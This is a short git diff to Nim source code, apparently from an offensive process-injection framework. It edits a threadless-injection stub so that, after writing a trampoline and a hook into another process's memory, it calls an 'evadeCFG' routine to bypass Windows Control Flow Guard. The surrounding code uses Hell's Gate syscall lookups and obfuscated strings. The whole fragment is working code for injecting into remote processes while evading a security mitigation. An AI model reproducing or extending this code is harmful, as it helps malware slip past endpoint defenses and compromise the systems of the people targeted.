@@ -34,6 +34,8 @@ var buffers: HookTrampolineBuffers
 
 let ThreadlessInjectStub * = """
 
+import cfgadd
+
 proc threadlessThread*(processHandle: HANDLE, jumpAddress: LPVOID, exportAddress: LPVOID): bool =
     var 
         trampolineStk: array[91, byte]
@@ -177,6 +179,7 @@ proc threadlessThread*(processHandle: HANDLE, jumpAddress: LPVOID, exportAddress
     if (status == 0):
         when defined(verbose):
             echo obf("[+] Write memory success "), repr(trampolineAddress)
+        discard evadeCFG(processHandle, trampolineAddress)
     
     when defined(Hellsgate):
         if getSyscall(ntProtectTable):
@@ -216,6 +219,7 @@ proc threadlessThread*(processHandle: HANDLE, jumpAddress: LPVOID, exportAddress
     if (status == 0):
         when defined(verbose):
             echo obf("[+] Write memory for the hook success")
+        discard evadeCFG(processHandle, exportAddress)
     exportContent = nil
     hookCalled = 0
 
